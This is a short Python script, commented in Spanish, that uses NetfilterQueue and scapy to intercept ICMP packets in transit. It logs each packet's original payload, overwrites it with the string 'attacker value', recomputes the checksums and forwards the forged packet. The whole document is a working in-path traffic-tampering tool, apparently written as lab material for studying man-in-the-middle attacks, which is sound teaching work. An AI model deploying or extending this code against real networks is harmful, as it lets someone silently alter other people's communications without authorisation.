from netfilterqueue import NetfilterQueue
from scapy.all import IP, ICMP, Raw

def recalculate(pkt):
    """
    Recalcula los campos de longitud y checksum del paquete IP e ICMP.

    Args:
        pkt (scapy.packet.Packet): El paquete a recalcular.

    Returns:
        scapy.packet.Packet: El paquete con los campos recalculados.
    """
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[ICMP].chksum
    pkt = pkt.__class__(bytes(pkt))
    return pkt

def intercept(packet):
    """
    Intercepta y modifica los paquetes ICMP, cambiando su payload.

    Args:
        packet (netfilterqueue.Packet): El paquete interceptado de la cola de netfilter.
    """
    payload = packet.get_payload()
    spkt = IP(payload)
    
    # Mostrar información de depuración del paquete recibido.
    print("Ha llegado un nuevo paquete")
    
    if spkt.haslayer(ICMP):
        print("Datos originales: ", str(spkt[Raw].load))
        
        # Modificar el payload del paquete ICMP.
        spkt[Raw].load = "attacker value"
        spkt.show()
        
        # Recalcular los campos de control.
        spkt = recalculate(spkt)
    
    # Reenviar el paquete modificado.
    packet.set_payload(bytes(spkt))
    packet.accept()

if __name__ == "__main__":
    nfqueue = NetfilterQueue()
    
    # Enlazar la cola de netfilter con la función interceptora.
    nfqueue.bind(1, intercept)
    
    try:
        print("Escaneando paquetes de manera activa...")
        nfqueue.run()
    except KeyboardInterrupt:
        pass